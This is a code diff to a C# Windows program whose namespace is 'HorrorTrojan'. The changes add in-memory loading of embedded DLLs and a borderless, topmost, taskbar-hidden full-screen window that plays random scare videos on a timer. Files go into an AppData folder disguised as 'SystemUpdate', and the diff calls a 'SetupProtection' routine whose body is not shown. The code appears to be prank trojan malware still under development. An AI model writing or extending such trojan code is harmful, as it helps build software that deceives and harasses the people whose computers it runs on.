@@ -1,4 +1,3 @@
-// MainInterface.cs
 using System;
 using System.Drawing;
 using System.Windows.Forms;
@@ -8,6 +7,7 @@ using System.IO;
 using System.Diagnostics;
 using System.Media;
 using System.Reflection;
+using AxWMPLib;
 
 namespace HorrorTrojan
 {
@@ -46,6 +46,29 @@ namespace HorrorTrojan
         private string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SystemUpdate");
         private SoundPlayer musicPlayer;
         private Image gifImage;
+        private AxWindowsMediaPlayer videoPlayer;
+
+        private string[] videoFiles = { "vd.mp4", "kj.mp4", "kf.mp4" };
+
+        // ЗАГРУЗКА DLL ИЗ ПАМЯТИ
+        static MainInterface()
+        {
+            AppDomain.CurrentDomain.AssemblyResolve += (sender, args) =>
+            {
+                string assemblyName = new AssemblyName(args.Name).Name;
+                if (assemblyName == "AxInterop.WMPLib" || assemblyName == "Interop.WMPLib")
+                {
+                    using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(assemblyName + ".dll"))
+                    {
+                        if (stream == null) return null;
+                        byte[] buffer = new byte[stream.Length];
+                        stream.Read(buffer, 0, buffer.Length);
+                        return Assembly.Load(buffer);
+                    }
+                }
+                return null;
+            };
+        }
 
         public MainInterface()
         {
@@ -98,28 +121,26 @@ namespace HorrorTrojan
 
         private void MainInterface_Load(object sender, EventArgs e)
         {
-            // Убеждаемся, что папка существует
             if (!Directory.Exists(appDataPath))
                 Directory.CreateDirectory(appDataPath);
 
-            // Извлекаем ресурсы, если их нет
-            ExtractResourceIfMissing("hr.gif");
-            ExtractResourceIfMissing("dv.mp3");
-            ExtractResourceIfMissing("vd.mp4");
-            ExtractResourceIfMissing("kj.mp4");
-            ExtractResourceIfMissing("kf.mp4");
+            // Извлекаем ТОЛЬКО медиа-файлы (не DLL)
+            ExtractMediaFile("hr.gif");
+            ExtractMediaFile("dv.mp3");
+            ExtractMediaFile("vd.mp4");
+            ExtractMediaFile("kj.mp4");
+            ExtractMediaFile("kf.mp4");
 
             LoadResources();
             StartTimers();
             SetupProtection();
             PlayMusic();
 
-            // Показываем форму
             this.Show();
             this.BringToFront();
         }
 
-        private void ExtractResourceIfMissing(string fileName)
+        private void ExtractMediaFile(string fileName)
         {
             try
             {
@@ -273,38 +294,49 @@ namespace HorrorTrojan
         {
             try
             {
-                string[] videoFiles = { "vd.mp4", "kj.mp4", "kf.mp4" };
                 string videoPath = Path.Combine(appDataPath, videoFiles[rnd.Next(videoFiles.Length)]);
-                if (File.Exists(videoPath))
-                {
-                    var videoThread = new Thread(() =>
-                    {
-                        try
-                        {
-                            Process.Start(new ProcessStartInfo
-                            {
-                                FileName = videoPath,
-                                UseShellExecute = true,
-                                CreateNoWindow = true,
-                                WindowStyle = ProcessWindowStyle.Maximized
-                            });
-                            Thread.Sleep(5000);
-                        }
-                        catch { }
-                        finally
-                        {
-                            isVideoActive = false;
-                            videoTimer.Start();
-                        }
-                    });
-                    videoThread.IsBackground = true;
-                    videoThread.Start();
-                }
-                else
+                if (!File.Exists(videoPath))
                 {
                     isVideoActive = false;
                     videoTimer.Start();
+                    return;
                 }
+
+                Form videoForm = new Form();
+                videoForm.FormBorderStyle = FormBorderStyle.None;
+                videoForm.WindowState = FormWindowState.Maximized;
+                videoForm.TopMost = true;
+                videoForm.ShowInTaskbar = false;
+                videoForm.BackColor = Color.Black;
+
+                videoPlayer = new AxWindowsMediaPlayer();
+                videoPlayer.Dock = DockStyle.Fill;
+                videoPlayer.settings.setMode("loop", false);
+                videoPlayer.uiMode = "none";
+                videoPlayer.URL = videoPath;
+                videoPlayer.PlayStateChange += (s, ev) =>
+                {
+                    if (ev.newState == 8) // stopped
+                    {
+                        videoForm.BeginInvoke((Action)(() =>
+                        {
+                            videoForm.Close();
+                            isVideoActive = false;
+                            videoTimer.Start();
+                        }));
+                    }
+                };
+
+                videoForm.Controls.Add(videoPlayer);
+                videoForm.Shown += (s, ev) => videoPlayer.Ctlcontrols.play();
+                videoForm.FormClosing += (s, ev) =>
+                {
+                    try { videoPlayer.close(); } catch { }
+                    isVideoActive = false;
+                    videoTimer.Start();
+                };
+
+                videoForm.Show();
             }
             catch
             {
@@ -395,6 +427,7 @@ namespace HorrorTrojan
                 videoTimer?.Dispose();
                 musicPlayer?.Dispose();
                 gifImage?.Dispose();
+                try { videoPlayer?.close(); } catch { }
             }
             base.Dispose(disposing);
         }
